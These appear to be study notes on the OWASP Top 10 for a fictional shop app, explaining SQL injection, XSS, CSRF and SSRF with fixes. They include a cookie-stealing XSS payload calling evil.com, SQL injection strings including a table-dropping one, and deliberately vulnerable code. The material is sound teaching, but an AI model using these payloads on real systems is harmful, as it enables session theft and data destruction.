# OWASP (Open Worldwide Application Security Project) Top 10 — Knowledge / Study Notes

[← Topic overview](../README.md)

> Topic: SQLi (SQL Injection), XSS (Cross-Site Scripting), CSRF (Cross-Site Request Forgery), common web vulnerabilities.

> **🛒 Where we are in building ShopFast** — Last topic we gave ShopFast an [identity layer](../../01-auth/01-knowledge/README.md) — JWT (JSON Web Token) tokens, OAuth2 (Open Authorization 2.0), RBAC (Role-Based Access Control), and a Redis denylist. We know *who* is calling. Now we defend against the ways they (or adversaries) will try to abuse the app: this topic maps the OWASP Top 10 onto ShopFast's two highest-risk surfaces — the **catalog search** (SQLi / SQL Injection) and the **cart/checkout** (XSS / Cross-Site Scripting + CSRF / Cross-Site Request Forgery). **Next:** [Cryptography](../../03-crypto/01-knowledge/README.md) — protecting the payment data at rest and in transit that attackers are ultimately after.

---

## Teaching arc: hardening ShopFast against the OWASP Top 10

### What it is

The **OWASP (Open Worldwide Application Security Project) Top 10** is a periodically updated consensus list of the most critical web-application security risks. Think of it as the industry's "most wanted" list for web vulnerabilities — not a checklist of individual bugs, but a ranked list of *risk categories*, each with a root cause and a family of defenses.

A useful mental model: the OWASP Top 10 is the **X-ray before surgery**. You're not treating every possible illness; you're scanning for the highest-probability killers. A new-grad asks "what does OWASP stand for?" A senior asks "which of these categories are most likely to fire in our specific architecture, and what does our defense look like?"

The **2021 edition** is the current widely-referenced version. Categories were reorganized around root causes rather than individual CVEs (Common Vulnerabilities and Exposures).

---

### What it looks like

Two ShopFast attack scenarios shown as raw HTTP — the attack and the fix side by side:

**Attack 1: SQLi (SQL Injection) on catalog search**

```
# Attacker crafts a search query that breaks out of the SQL string
GET /v1/products?q=shoes'+OR+'1'='1  HTTP/1.1

# What the vulnerable server builds in the DB layer:
SELECT * FROM products WHERE name LIKE '%shoes' OR '1'='1%'
#                                         ^^^^^^^^^^^^^^^^^
#                                         always true → returns ALL rows,
#                                         potentially including admin drafts,
#                                         unpublished prices, or inventory data
```

**Attack 2: Stored XSS (Cross-Site Scripting) in product reviews → steals admin session**

```
# Attacker submits a product review containing a script tag:
POST /v1/products/42/reviews
{ "text": "Great mouse! <script>fetch('https://evil.com?c='+document.cookie)</script>" }

# If the server stores and renders this verbatim, every browser that loads
# product 42's page executes the script.  An admin viewing the review
# exposes their session cookie → attacker logs in as admin.
```

---

### The code that builds it

Parameterized query (SQLi defense) and output encoding (XSS defense) in the ShopFast catalog/review modules:

```typescript
// VULNERABLE — string interpolation lets the query be rewritten
async function searchProductsBad(query: string) {
  // NEVER do this — an attacker controls `query`
  const sql = `SELECT * FROM products WHERE name LIKE '%${query}%'`;
  return db.raw(sql);
}

// SAFE — parameterized query: data travels separately from SQL structure
async function searchProducts(query: string) {
  // The DB driver sends the query text and the parameter separately.
  // The parameter is ALWAYS treated as data, never as SQL syntax.
  return db.query(
    "SELECT id, name, price FROM products WHERE name ILIKE $1 AND published = true",
    [`%${query}%`]   // $1 placeholder — DB never interprets this as SQL
  );
}

// For rendering reviews, encode output — React does this automatically,
// but if you ever use dangerouslySetInnerHTML you bypass it:
function ReviewText({ text }: { text: string }) {
  // SAFE: React escapes text content by default — never use dangerouslySetInnerHTML
  // with untrusted content.
  return <p>{text}</p>;   // < > & " ' all encoded to HTML entities
}

// If you MUST render user-supplied HTML (e.g., rich text editor output),
// sanitize with a vetted library BEFORE inserting into the DOM:
import DOMPurify from "dompurify";
function RichReview({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />;
}
```

---

### The code that calls it

CSRF (Cross-Site Request Forgery) defense on the cart — `SameSite` cookies + token validation on state-changing endpoints:

```typescript
// Server: issue a CSRF (Cross-Site Request Forgery) token alongside the session
app.get("/v1/cart/csrf-token", requireAuth, (req, res) => {
  // The token is tied to the session; the browser JS reads and re-sends it
  // in a custom header — a cross-origin request CAN'T set custom headers
  // (blocked by CORS preflight), so this proves the request came from our page
  const csrfToken = crypto.randomBytes(32).toString("hex");
  req.session.csrfToken = csrfToken;
  res.json({ csrfToken });
});

// Server: validate the CSRF token on cart mutations
app.post("/v1/cart/items", requireAuth, (req, res) => {
  const headerToken = req.headers["x-csrf-token"];
  if (headerToken !== req.session.csrfToken) {
    return res.status(403).json({ error: "csrf_mismatch" });
  }
  // ... add item to cart
});

// Client: fetch and attach the CSRF token to cart mutations
async function addToCart(productId: string) {
  const { csrfToken } = await fetch("/v1/cart/csrf-token", {
    credentials: "include"
  }).then(r => r.json());

  return fetch("/v1/cart/items", {
    method: "POST",
    credentials: "include",                   // send the session cookie
    headers: {
      "Content-Type": "application/json",
      "x-csrf-token": csrfToken,              // custom header — CSRF-safe
    },
    body: JSON.stringify({ productId }),
  });
}
```

> Note: if ShopFast's cart API uses `Authorization: Bearer <JWT>` headers (not cookies) for auth, CSRF is not a risk for that endpoint — cross-site requests can't auto-send custom headers. The CSRF risk is specific to **cookie-based auth**.

---

### Types & differences

| Attack | Root cause | ShopFast surface | Primary defense |
|---|---|---|---|
| **SQLi (SQL Injection)** | Untrusted input treated as SQL syntax | Catalog search (`?q=`) | Parameterized queries |
| **Stored XSS (Cross-Site Scripting)** | Attacker content persisted + rendered as script | Product reviews, descriptions | Context-aware output encoding (React default) |
| **Reflected XSS** | Server echoes input back as script | Search result page (`?q=`) | Output encoding; CSP (Content Security Policy) header |
| **DOM XSS** | Client JS writes input into a dangerous sink | Any client-side rendering | Avoid `innerHTML`/`eval`; use `textContent` |
| **CSRF (Cross-Site Request Forgery)** | Browser auto-sends cookies cross-site | Cart mutations, checkout | `SameSite=Lax` cookies; CSRF tokens |
| **SSRF (Server-Side Request Forgery)** | Server fetches user-supplied URL | Any URL-accepting input | Allow-list hosts; block link-local IPs |
| **IDOR (Insecure Direct Object Reference)** | No ownership check on object ID | `/v1/orders/42` | Server-side ownership scoping |

---

### Build it for real — ShopFast

ShopFast's two highest-risk surfaces per the OWASP Top 10:

**Catalog search (SQLi / SQL Injection risk — A03 Injection):**
- The search box is user-controlled input that flows directly into a SQL LIKE query against the `products` table.
- **Decision:** parameterized queries via the ORM (Object-Relational Mapper) for all catalog queries. The ORM parameterizes by default, but we explicitly audit any raw SQL fragments (e.g., dynamic `ORDER BY`) and use column allow-lists rather than interpolation.
- **Rejected:** input validation as the primary defense — regex-based validation is bypassable and doesn't prevent injection through encoded or unusual payloads. It's defense-in-depth only.

**Cart and checkout (XSS + CSRF — A03 Injection, A01 Broken Access Control):**
- Product descriptions and reviews render in the browser. If stored XSS lands there, an attacker can steal customer session cookies or silently modify a cart.
- **Decision:** React's default JSX escaping handles HTML context. Strict CSP (Content Security Policy) header (`default-src 'self'; script-src 'self'`) limits blast radius if a bypass is found.
- Cart mutations are cookie-authenticated, so CSRF (Cross-Site Request Forgery) is a real risk. **Decision:** `SameSite=Lax` on session cookies (blocks cross-site POST by default in modern browsers) + anti-CSRF (Cross-Site Request Forgery) token for checkout, which is the highest-stakes mutation.

> **If you get this wrong…** A SQLi vulnerability on the catalog search gives an attacker read access to every table the DB user can reach — in a shared-schema monolith that means orders, payment references, and user data. A stored XSS on reviews that targets an admin session is an account-takeover with full catalog-management access. These are not theoretical: injection is OWASP's #3 and broken access control is #1 precisely because they're so common and so damaging.

---

### Scaling story

- **Now (launch):** ORM parameterization for SQLi, React default escaping for XSS, `SameSite=Lax` for CSRF, CSP (Content Security Policy) header. Cost: zero runtime overhead; the defenses are baked into the framework.
- **Growth signal:** user-generated content surfaces expand (seller product descriptions, Q&A, reviews) — rich HTML is now required, raising the XSS bar. Dynamic SQL for advanced filtering (facets, range queries) creates new SQLi surface.
- **At scale (millions+):** add a WAF (Web Application Firewall) at the edge as a detection/alerting layer (not a primary defense — it can be bypassed). Run SAST (Static Application Security Testing) and DAST (Dynamic Application Security Testing) in CI (Continuous Integration). Adopt a Content Security Policy nonce-based approach for any inline scripts. For the rich-HTML surfaces, enforce server-side DOMPurify sanitization with a strict allow-list before persistence (not just at render time). Tie into [Secrets](../../04-secrets/01-knowledge/README.md) management for the DB credentials that power these queries.

---

## 1. What the OWASP (Open Worldwide Application Security Project) Top 10 is

The **OWASP Top 10** is a periodically updated, consensus list of the most critical web-application security risks, maintained by the Open Worldwide Application Security Project. It's a *risk* list (categories), not a checklist of bugs. The **2021** revision is the current widely-referenced edition; categories were reorganized around root causes rather than individual CWEs (Common Weakness Enumerations). Know the categories, their root causes, and concrete defenses — interviewers care about *why* each happens and how you'd stop it, not rote recall of the ranking.

### The 2021 categories
1. **A01 Broken Access Control** — users acting outside their permissions (IDOR / Insecure Direct Object Reference, missing function-level checks, path traversal). *Now #1 — the most common serious flaw.*
2. **A02 Cryptographic Failures** — sensitive data exposed due to weak/missing crypto (plaintext storage, weak hashes, no TLS / Transport Layer Security). (Formerly "Sensitive Data Exposure.")
3. **A03 Injection** — untrusted input interpreted as code/commands: SQLi (SQL Injection), NoSQLi, OS command injection, LDAP. **XSS (Cross-Site Scripting) now lives here.**
4. **A04 Insecure Design** — flaws baked into the design, not the implementation; missing threat modeling and secure-design patterns.
5. **A05 Security Misconfiguration** — default creds, verbose errors, open cloud buckets, unnecessary features enabled. (XXE / XML External Entity folded in here.)
6. **A06 Vulnerable & Outdated Components** — using libraries/frameworks with known CVEs (Common Vulnerabilities and Exposures).
7. **A07 Identification & Authentication Failures** — weak credential handling, broken session management, no MFA (Multi-Factor Authentication). (Formerly "Broken Authentication.")
8. **A08 Software & Data Integrity Failures** — unsigned updates, insecure deserialization, compromised CI/CD (Continuous Integration/Continuous Deployment) supply chain.
9. **A09 Security Logging & Monitoring Failures** — can't detect or respond to breaches.
10. **A10 Server-Side Request Forgery (SSRF)** — server tricked into making requests to internal/unintended targets.

---

## 2. Injection (A03) — the classics

### SQL Injection (SQLi)
Untrusted input concatenated into a SQL query lets an attacker alter its structure.

```python
# VULNERABLE — string concatenation
cur.execute("SELECT * FROM users WHERE email = '" + email + "'")
# email = "' OR '1'='1" -> returns all rows; "'; DROP TABLE users; --" -> destructive
```

**Defense (in priority order):**
- **Parameterized queries / prepared statements** — the only robust fix. Data is sent separately from the query text, so it can never change structure.
- **ORMs (Object-Relational Mappers)** that parameterize by default (but raw fragments can still be unsafe).
- **Allow-listing** for things that can't be parameterized (e.g., a column name in `ORDER BY`).
- **Least-privilege DB accounts** (defense in depth — limits blast radius).
- Input validation helps but is **not** a primary defense; escaping by hand is error-prone.

### Command / NoSQL / LDAP injection
Same root cause — input crossing into an interpreter. Use safe APIs (parameterized queries, `execve`-style arg arrays instead of shell strings, query builders that separate operators from values).

### Cross-Site Scripting (XSS) — now under Injection
Attacker-controlled data ends up in a page as executable script.
- **Stored XSS**: payload persisted (e.g., a comment) and served to other users.
- **Reflected XSS**: payload echoed straight back from the request (e.g., a search term in the response).
- **DOM-based XSS**: client-side JS writes untrusted data into a sink (`innerHTML`, `eval`).

**Defense:**
- **Context-aware output encoding** — encode for HTML body, attribute, JS, URL, or CSS context appropriately. The framework's auto-escaping (React, modern templating) handles most of this — don't bypass it (`dangerouslySetInnerHTML`, `v-html`).
- **Content Security Policy (CSP)** — restrict script sources; a strong defense-in-depth that limits impact even if encoding is missed.
- **Avoid dangerous sinks** (`innerHTML`, `eval`); use `textContent`.
- Sanitize rich HTML with a vetted library (DOMPurify) when you must allow markup.

---

## 3. Cross-Site Request Forgery (CSRF)

CSRF (Cross-Site Request Forgery) tricks an authenticated user's **browser** into sending a state-changing request the user didn't intend. It exploits the browser's habit of **automatically attaching cookies** to requests for a site, regardless of who initiated them.

**Defenses:**
- **`SameSite` cookies** (`Lax` default in modern browsers, `Strict` for sensitive) — stop cookies from being sent on cross-site requests. Primary modern defense.
- **Anti-CSRF tokens** — a per-session/per-request unpredictable token the server issues and validates (synchronizer token pattern). Required for the form/POST that mutates state.
- **Double-submit cookie** pattern as a stateless alternative.
- **Re-check `Origin`/`Referer`** headers for sensitive actions.
- Note: CSRF mainly affects **cookie-based** auth. Bearer tokens in `Authorization` headers aren't auto-sent cross-site, so they're not CSRF-vulnerable in the same way (but then watch XSS / Cross-Site Scripting).

---

## 4. Other categories worth depth

- **Broken Access Control (A01):** enforce **server-side, default-deny, object-level** checks. Don't rely on hidden UI or unguessable IDs. Watch IDOR (Insecure Direct Object Reference), missing function-level authorization, and path traversal (`../`).
- **SSRF (Server-Side Request Forgery — A10):** the server fetches a user-supplied URL and an attacker points it at `http://169.254.169.254/` (cloud metadata) or internal services. Defend with **allow-lists** of hosts/schemes, blocking link-local/private IP ranges, disabling unused URL schemes, and using IMDSv2 on AWS.
- **Insecure Deserialization (A08):** never deserialize untrusted data into rich objects (Java/Python `pickle`/PHP). Prefer data-only formats (JSON) with strict schemas; if you must, sign the payload.
- **XXE (XML External Entity — within A05):** disable external entity resolution in XML parsers.
- **Security Misconfiguration (A05):** harden defaults, remove debug endpoints, set security headers (`HSTS` / HTTP Strict Transport Security, `X-Content-Type-Options: nosniff`, CSP / Content Security Policy), lock down cloud storage permissions.
- **Vulnerable Components (A06):** maintain an **SBOM (Software Bill of Materials)**, run SCA (Software Composition Analysis — Dependabot/Snyk), patch promptly.

---

## 5. Cross-cutting defenses (the senior framing)

- **Defense in depth** — no single control; layer parameterization + least privilege + monitoring.
- **Secure by default** — frameworks that auto-escape, ORMs that parameterize, `SameSite` defaults.
- **Least privilege** everywhere — DB accounts, service roles, token scopes.
- **Validate input, encode output** — and know they solve different problems (validation rejects bad data; encoding makes data safe *for a specific context*).
- **Shift left** — threat modeling (A04 exists because design flaws can't be patched away), SAST (Static Application Security Testing)/DAST (Dynamic Application Security Testing)/SCA (Software Composition Analysis) in CI (Continuous Integration), security reviews.

---

## 6. Common pitfalls & misconceptions

- **"Input validation stops SQLi (SQL Injection)."** It helps but isn't sufficient — **parameterized queries** are the real fix. Escaping by hand is fragile.
- **"We use an ORM (Object-Relational Mapper), so we're safe from SQLi."** Only for parameterized paths; raw SQL fragments and unsafe `LIKE`/`ORDER BY` interpolation reintroduce it.
- **"Encoding and sanitization are the same."** Encoding renders data inert for a context; sanitization strips dangerous content from rich input. Different tools.
- **"CSRF (Cross-Site Request Forgery) tokens stop XSS (Cross-Site Scripting)"** (and vice versa) — they defend different attacks. XSS can defeat CSRF tokens by reading them.
- **"Unguessable IDs fix IDOR (Insecure Direct Object Reference)."** That's obscurity, not authorization. Always check ownership.
- **"HTTPS protects against XSS/SQLi."** TLS (Transport Layer Security) only protects data in transit; injection is an application-layer flaw.
- **Trusting client-side validation** — it's UX only; the server must re-validate and re-authorize.

---

## 7. What interviewers probe

- Given a vulnerable code snippet, identify the flaw and rewrite it safely (SQLi → prepared statement; XSS → encoding/CSP).
- Difference between stored, reflected, and DOM XSS (Cross-Site Scripting), and the matching defenses.
- Why parameterization beats escaping/validation for SQLi (SQL Injection).
- How CSRF (Cross-Site Request Forgery) works mechanically and why `SameSite` + tokens stop it; why bearer-token APIs differ.
- How SSRF (Server-Side Request Forgery) reaches cloud metadata and how to lock it down.
- The distinction between authentication and authorization failures (A07 vs A01).

---

## 8. Quick-reference summary

- **A01 Broken Access Control is #1** — server-side, default-deny, object-level checks; beware IDOR (Insecure Direct Object Reference).
- **Injection (A03)**: fix SQLi (SQL Injection) with **parameterized queries**; fix XSS (Cross-Site Scripting) with **context-aware output encoding + CSP (Content Security Policy)**; never feed untrusted input to an interpreter.
- **XSS** = stored / reflected / DOM; avoid `innerHTML`/`eval`; sanitize rich HTML with DOMPurify.
- **CSRF (Cross-Site Request Forgery)**: `SameSite` cookies + anti-CSRF tokens; mainly a cookie-auth problem.
- **SSRF (Server-Side Request Forgery — A10)**: allow-list hosts, block link-local/private ranges, IMDSv2.
- **Crypto failures (A02)**: TLS (Transport Layer Security) in transit, strong hashing at rest, no plaintext secrets.
- **A06 components**: SBOM (Software Bill of Materials) + SCA (Software Composition Analysis) + patch. **A09**: log & monitor so you can detect breaches.
- Mindset: **defense in depth, secure by default, least privilege, validate input / encode output.**
